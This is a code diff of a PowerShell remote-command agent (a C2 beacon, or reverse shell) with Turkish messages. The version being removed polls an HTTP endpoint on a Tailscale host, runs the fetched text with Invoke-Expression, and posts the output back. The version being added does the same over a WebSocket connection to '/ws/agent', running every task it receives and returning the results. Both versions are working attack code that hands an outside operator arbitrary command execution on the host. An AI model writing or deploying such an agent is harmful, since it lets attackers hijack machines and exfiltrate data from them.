@@ -1,52 +1,52 @@
-$baseUrl = "https://desktop-3okhbnm.tail6c20b1.ts.net"
-$url = "https://desktop-3okhbnm.tail6c20b1.ts.net/temp.txt"
-$resp="s"
-$headers = @{
-    "ngrok-skip-browser-warning" = "1"
-}
-while ($true) {
-    try {
+$uri = [Uri]"wss://desktop-3okhbnm.tail6c20b1.ts.net//ws/agent"
+$ws = [System.Net.WebSockets.ClientWebSocket]::new()
 
-        $response = Invoke-WebRequest `
-        -Uri $url `
-        -Method Get `
-        -Headers $headers `
-        -UseBasicParsing
+try {
+    $ws.ConnectAsync(
+        $uri,
+        [Threading.CancellationToken]::None
+    ).GetAwaiter().GetResult()
 
-        $response.Content
-        $response = $response.Content.Substring(0, [Math]::Min(500, $response.Content.Length))
-        #$response= (Invoke-WebRequest -Uri $url).Content
-        Start-Sleep -Seconds 2
-        if ($response.action -eq "exit") {
-            Write-Host "Sunucu oturumu kapattı."
+    Write-Host "Connected"
+
+    $buffer = New-Object byte[] 4096
+
+    while ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
+        $segment = [ArraySegment[byte]]::new($buffer)
+
+        $received = $ws.ReceiveAsync(
+            $segment,
+            [Threading.CancellationToken]::None
+        ).GetAwaiter().GetResult()
+
+        if ($received.MessageType -eq
+            [System.Net.WebSockets.WebSocketMessageType]::Close) {
             break
         }
 
-        if ($response -ne $resp){
-            $resp = $response
-            $result = Invoke-Expression $response | Out-String
-            $result = $result.Trim()
-            Write-Host ""
-            Write-Host "Sunucu: $($response)"
+        $json = [Text.Encoding]::UTF8.GetString(
+            $buffer, 0, $received.Count
+        )
+        $message = $json | ConvertFrom-Json
+        $result = Invoke-Expression $message.task | Out-String
+        if ($message.task -eq "hostname" -or 1 -eq 1) {
+            $reply = @{
+                task   = "hostname"
+                result = $result.Trim()
+            } | ConvertTo-Json -Compress
+            #Write-Host $result
+            $bytes = [Text.Encoding]::UTF8.GetBytes($reply)
+            $segmentOut = [ArraySegment[byte]]::new($bytes)
 
-            #$answer = Read-Host "Yanıtın"
-            $body = @{
-                message = $result
-            }
-
-                   Invoke-RestMethod `
-                        -Uri "$baseUrl/reply" `
-                        -Method Post `
-                        -Headers @{ "ngrok-skip-browser-warning" = "1" } `
-                        -Body $body
-
-            Write-Host "Yanıt sunucuya gönderildi."
+            $ws.SendAsync(
+                $segmentOut,
+                [System.Net.WebSockets.WebSocketMessageType]::Text,
+                $true,
+                [Threading.CancellationToken]::None
+            ).GetAwaiter().GetResult()
         }
     }
-    catch {
-        Write-Warning $_.Exception.Message
-        Start-Sleep -Seconds 3
-    }
-
-    Start-Sleep -Milliseconds 300
+}
+finally {
+    $ws.Dispose()
 }
